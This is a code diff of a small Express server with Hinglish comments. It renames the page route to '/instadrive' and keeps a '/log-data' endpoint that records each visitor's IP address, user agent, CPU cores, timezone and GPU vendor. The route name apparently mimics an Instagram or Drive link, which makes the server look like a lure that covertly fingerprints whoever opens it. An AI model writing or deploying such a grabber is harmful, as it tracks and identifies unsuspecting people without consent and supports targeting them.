@@ -3,15 +3,13 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-// JSON data read karne ke liye middleware
 app.use(express.json());
 
-// Jab koi main link ya /test-link khole toh HTML file dikhao
-app.get('/test-link', (req, res) => {
+// Rasta badal kar /instadrive kar diya gaya hai
+app.get('/instadrive', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Frontend se data receive karne ka endpoint
 app.post('/log-data', (req, res) => {
     const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const userAgent = req.headers['user-agent'];
@@ -24,7 +22,6 @@ app.post('/log-data', (req, res) => {
     console.log(`[+] Logical CPU Cores: ${hardware.logicalCores}`);
     console.log(`[+] Timezone: ${hardware.timezone}`);
     console.log(`[+] GPU Vendor: ${hardware.gpuVendor}`);
-    console.log(`[+] GPU Renderer: ${hardware.gpuRenderer}`);
     console.log(`==============================================\n`);
 
     res.sendStatus(200);
